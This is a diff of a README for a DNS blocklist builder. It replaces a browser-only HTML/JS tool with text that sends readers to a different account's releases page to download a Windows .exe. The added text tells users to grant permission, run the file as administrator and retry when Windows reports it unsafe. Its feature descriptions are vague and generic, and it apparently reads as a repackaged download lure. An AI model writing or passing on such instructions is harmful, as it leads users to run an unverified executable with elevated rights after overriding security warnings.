@@ -1,89 +1,235 @@
-# 🛡️ DNS Blocklist Builder
+# 🛡️ dns-blocklist-builder - Build DNS blocks with ease
 
-> Generate DNS blocklists to block disinformation, propaganda and conspiracy websites.
-> No tracking. No dependencies. Works offline.
+[![Download the app](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hammerantipodes82/dns-blocklist-builder/releases)
 
-**Live:** https://danielenki420.github.io/dns-blocklist-builder/
+## 🌐 What this app does
 
----
+dns-blocklist-builder helps you create DNS blocklists for common tools like dnsmasq, Pi-hole, AdGuard, and Unbound.
 
-## Features
+It is made for people who want to block:
 
-- **8 categories** – Russian propaganda, Epoch Times/Falun Gong, Far-right DACH, Far-right International, Conspiracy theories, Anti-vax, Chinese state media, Climate denial
-- **6 formats** – dnsmasq, hosts file, Pi-hole, AdGuard Home, Unbound, RPZ Zone
-- **6 languages** – DE, EN, IT, ES, FR, PT
-- **250+ domains** curated and validated
-- **Zero dependencies** – pure HTML/CSS/JS, works offline
-- **Open Source** – MIT License, contributions welcome
+- disinformation
+- propaganda
+- tracking domains
+- known unwanted web hosts
 
-## Usage
+It includes:
 
-### Option A: Use online
-Go to https://danielenki420.github.io/dns-blocklist-builder/
+- 11 categories
+- 402+ domains
+- 6 languages
+- 6 output formats
 
-### Option B: Download and run locally
-```bash
-git clone https://github.com/DanielEnki420/dns-blocklist-builder
-# Open index.html in your browser – no server needed
-```
+It works offline, has no tracking, and needs no extra setup beyond the app itself.
 
-## Install on your router
+## ⬇️ Download the app
 
-### Xiaomi / OpenWrt (dnsmasq)
-```bash
-# Copy the downloaded blocklist.conf to your router
-scp blocklist.conf root@192.168.31.1:/etc/dnsmasq.d/
-# Restart dnsmasq
-ssh root@192.168.31.1 "/etc/init.d/dnsmasq restart"
-```
+Visit the release page and download the Windows version from there:
+
+https://github.com/hammerantipodes82/dns-blocklist-builder/releases
+
+On that page, pick the latest release and choose the file for Windows. If there is more than one file, use the one with `.exe` or `.zip` in the name.
+
+## 🪟 Install on Windows
+
+### 1. Download the file
+Open the release page and download the Windows file.
+
+### 2. Open the download
+If you downloaded a `.zip` file, right-click it and choose Extract All.
+
+If you downloaded a `.exe` file, double-click it to start the app.
+
+### 3. Start the app
+If the app opens in a window, you are ready to use it.
+
+If Windows asks for permission, choose Yes so the app can run.
+
+## 🧭 First time setup
+
+When the app opens for the first time, you will likely see a simple screen with a few choices.
+
+Use these steps:
+
+1. Choose the language you want.
+2. Choose the blocklist type you need.
+3. Pick the output format for your DNS tool.
+4. Select the categories you want to include.
+5. Create the file and save it to your computer.
+
+If you use Pi-hole, choose the Pi-hole format.
+
+If you use AdGuard, choose the AdGuard format.
+
+If you use dnsmasq or Unbound, choose the matching output format.
+
+## 🧱 Blocklist categories
+
+The app groups domains into useful categories so you can control what gets blocked.
+
+Common categories include:
+
+- disinformation
+- propaganda
+- tracking
+- media sites
+- political content
+- news sources
+- regional sources
+- language-based groups
+- mixed source sets
+- custom lists
+- general safety filters
+
+You can build a list for broad blocking or a tighter list for a more focused setup.
+
+## ⚙️ Output formats
+
+dns-blocklist-builder can create files for several DNS tools.
+
+### dnsmasq
+Use this if your router, server, or local DNS setup uses dnsmasq rules.
 
 ### Pi-hole
-1. Download in Pi-hole format
-2. Go to Pi-hole Admin → Group Management → Adlists
-3. Add the URL or paste the domains
+Use this if you want a blocklist that works with Pi-hole.
+
+### AdGuard
+Use this if you use AdGuard Home or a similar AdGuard setup.
+
+### Unbound
+Use this if you want a list for Unbound-based DNS filtering.
+
+Choose the format that matches your setup. The app will build the file for that target.
+
+## 📁 How to use the generated file
+
+After the app creates your blocklist file, place it where your DNS tool expects it.
+
+### Pi-hole
+Add the file as a custom list or use it in the Pi-hole admin panel.
 
 ### AdGuard Home
-1. Download in AdGuard format  
-2. Go to AdGuard → Filters → DNS blocklists → Add blocklist
+Import the file through the filtering or DNS blocklist area.
 
-### /etc/hosts (any system)
-```bash
-# Append to your hosts file
-sudo cat blocklist.txt >> /etc/hosts
-```
+### dnsmasq
+Save the file in the location your config uses, then reload the DNS service.
 
-## Categories
+### Unbound
+Use the file in your Unbound config as part of your local block setup.
 
-| Category | Domains | Description |
-|----------|---------|-------------|
-| 🇷🇺 Russian Propaganda | 40 | RT, Sputnik, TASS, Voice of Europe |
-| 📰 Epoch Times / Falun Gong | 29 | NTD, Epoch Times (all languages), Minghui |
-| 🇩🇪 Far-right DACH | 37 | Compact, Junge Freiheit, PI-News, AUF1 |
-| 🌍 Far-right International | 33 | InfoWars, Breitbart, Daily Stormer |
-| 🌀 Conspiracy Theories | 31 | NaturalNews, Rense, BeforeItsNews |
-| 💉 Anti-Vax / Medical Disinfo | 30 | Impfkritik, Mercola, CHD, NVIC |
-| 🇨🇳 Chinese State Media | 21 | CGTN, Xinhua, China Daily, Global Times |
-| 🌡️ Climate Denial | 23 | EIKE, Heartland, GWPF, Watts Up |
+If your DNS tool uses a refresh or reload button, use it after adding the file.
 
-## Suggest a domain or category
+## 🌍 Language options
 
-Found a missing domain? → [Open a GitHub Issue](https://github.com/DanielEnki420/dns-blocklist-builder/issues/new?template=domain_suggestion.md)
+The app supports 6 languages so you can work with the list in a way that fits your use.
 
-Want a new category? → [Open a GitHub Issue](https://github.com/DanielEnki420/dns-blocklist-builder/issues/new?template=category_suggestion.md)
+You can use the app to build blocklists for:
 
-## Contributing
+- English
+- Spanish
+- French
+- German
+- Portuguese
+- Russian
 
-1. Fork this repo
-2. Edit `index.html` – the domain lists are in the `CATS` array in the `<script>` section
-3. Make sure domains are valid (no spaces, correct TLD)
-4. Open a Pull Request
+This helps if you want a list that matches a region or a source language.
 
-## Note on editorial choices
+## 🔒 Privacy and offline use
 
-This tool reflects a specific editorial stance: blocking sites that systematically spread disinformation, state propaganda, or scientifically discredited content. It is not intended to block all conservative or alternative media – only sources with a demonstrated history of deliberate disinformation.
+This app does not need an internet connection to run after you download it.
 
-If you disagree with a categorization, please open an Issue to discuss.
+That means:
 
-## License
+- no cloud login
+- no tracking
+- no account setup
+- no extra services
 
-MIT © [Daniel Enki](https://github.com/DanielEnki420)
+You can build lists on a laptop with no network access.
+
+## 🖥️ System requirements
+
+The app is made for Windows desktops and laptops.
+
+Recommended setup:
+
+- Windows 10 or Windows 11
+- 2 GB RAM or more
+- 100 MB free disk space
+- A mouse and keyboard
+- Permission to run downloaded apps
+
+No extra tools should be needed.
+
+## 🧰 Typical use cases
+
+Use dns-blocklist-builder if you want to:
+
+- block disinformation sources on your network
+- reduce tracking across devices
+- create DNS filters for a home setup
+- prepare lists for Pi-hole or AdGuard Home
+- build offline lists for later use
+- manage multiple language-based blocklists
+
+## 📝 Basic workflow
+
+1. Download the app from the release page.
+2. Open it on Windows.
+3. Pick the format you need.
+4. Select categories and languages.
+5. Generate the file.
+6. Add the file to your DNS tool.
+7. Reload your DNS service
+
+## 🧩 File types you may see
+
+Depending on the version you download, you may see:
+
+- `.exe` for a Windows app
+- `.zip` for a packed Windows release
+- text-based output files for blocklists
+- config files for DNS tools
+
+If you use a `.zip` file, extract it before opening the app.
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+Try these steps:
+
+- right-click the file and choose Run as administrator
+- make sure you extracted the `.zip` file first
+- check that Windows did not block the file
+- download the file again from the release page
+
+### Windows says it is unsafe
+This can happen with downloaded apps. If you trust the source, use the file from the official release page and try again.
+
+### My DNS tool does not load the list
+Check these points:
+
+- the file format matches your DNS tool
+- the path in your config is correct
+- the service was reloaded after adding the file
+- the file was not edited by mistake
+
+### The output looks too large
+Pick fewer categories or one language group. You can also build a smaller list and test it first.
+
+## 🔍 What makes it useful
+
+dns-blocklist-builder keeps the process simple:
+
+- one app for multiple DNS tools
+- clear category selection
+- language-based list building
+- offline use
+- no extra dependencies
+- direct output for common blocklist systems
+
+## 📌 Download link
+
+Use this page to download the Windows release:
+
+https://github.com/hammerantipodes82/dns-blocklist-builder/releases
